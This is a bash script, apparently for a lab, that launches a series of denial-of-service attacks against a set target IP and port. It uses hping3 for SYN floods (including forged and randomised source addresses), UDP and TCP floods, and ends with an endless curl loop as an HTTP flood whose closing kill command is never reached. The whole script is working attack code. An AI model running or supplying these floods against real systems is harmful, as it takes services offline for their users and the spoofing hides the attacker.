TARGET_IP="172.20.10.1"  
TARGET_PORT=5000

echo "Attack start..."
sleep 2

# 1. Basic SYN Flood
echo "1. Basic SYN Flood..."
sudo hping3 -S --flood -p $TARGET_PORT $TARGET_IP &
sleep 5
kill $!

# 2. SYN Flood + Forged fixed source IP
echo "2. SYN Flood + Forged fixed source IP..."
sudo hping3 -S --flood -a 1.2.3.4 -p $TARGET_PORT $TARGET_IP &
sleep 5
kill $!

# 3. SYN Flood + Random Source IP
echo "3. SYN Flood + Random Source IP..."
sudo hping3 -S --flood --rand-source -p $TARGET_PORT $TARGET_IP &
sleep 5
kill $!


# 4. UDP Flood Attack
echo "4. UDP Flood Attack..."
sudo hping3 --udp --flood -p 5000 $TARGET_IP &
sleep 5
kill $!

# 5. TCP Flood
echo "5. TCP Flood Attack..."
sudo hping3 --flood -p $TARGET_PORT $TARGET_IP &
sleep 5
kill $!

# 6. Basic HTTP Flood 
echo "6. Basic HTTP Flood..."
while true; do
  curl -s http://$TARGET_IP:$TARGET_PORT/ > /dev/null
  sleep 0.1
done 
pkill curl